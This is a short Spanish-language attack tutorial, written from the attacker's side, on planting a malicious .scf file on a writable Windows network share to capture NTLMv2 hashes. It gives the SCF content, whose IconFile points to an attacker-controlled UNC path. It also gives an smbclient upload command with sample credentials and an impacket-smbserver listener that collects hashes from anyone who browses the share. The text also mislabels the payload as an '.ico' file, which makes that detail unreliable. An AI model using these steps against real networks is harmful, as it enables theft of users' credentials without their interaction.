# Para que sirve crear un scf malicioso?
En el caso de que nosotros como atacantes tengamos permisos de escritura en algún recurso compartido a nivel de red puede ser muy crítico, la idea es que podemos crear un archivo `.scf` malicioso y subirlo al recurso comparido, el problema es que el icono de carga de estos archivos en el explorador de Windows puede haber sido envenenado por el atacante haciendo que cuando alguien lo vea, sin necesidad de interactuar con el, se comunique con nuestro equipo y obtener su Hash `NTLMv2`.

# Como efectuar el ataque
Primero debemos crear un archivo .ico malicioso que tenga una estructura como esta:
```
[Shell]
Command=2
IconFile=\\192.168.140.45\smbFolder\patucasa.ico
[Taskbar]
Command=ToggleDesktop
```
Despues podríamos conectarnos al recurso compartido a nivel de red en el cual tenermos permisos de escritura con alguna herramienta como smblcient
```
smbclient -U "wizcorp.local\WizzzStark%Password1" //192.168.46.130/SharedFiles
```
Una vez dentro de la sesión interactica podemos subir el archivo con 'put file.ico' y posteriormente nos ponemos en escucha con `smbserver` para crear el recurso que indicamos en el archivo malicioso
```
impacket-smbserver smbFolder $(pwd) -smb2support
```
Y ahora solo toca esperar a que alguien abra el recurso donde está el .ico y obtendremos su `Hash NTLMv2`
